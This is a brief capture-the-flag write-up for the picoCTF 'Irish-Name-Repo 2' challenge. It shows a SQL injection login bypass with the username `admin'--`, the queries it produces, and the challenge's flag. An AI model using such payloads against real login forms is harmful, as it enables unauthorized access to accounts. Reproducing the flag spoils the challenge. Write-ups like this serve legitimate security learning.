# Irish-Name-Repo 2
If we try the same thing as before the server helpfully tells us "SQLi detected."

However a username of `'--` gives "Login failed."
```sql
SELECT * FROM users WHERE name=''--' AND password=''
```
Now we just need to guess a name. `admin` is usually a good guess.

This would meen we need a username of `admin'--`, generating a query of

```sql
SELECT * FROM users WHERE name='admin'--' AND password=''
```

Flag: `picoCTF{m0R3_SQL_plz_daf42601}`
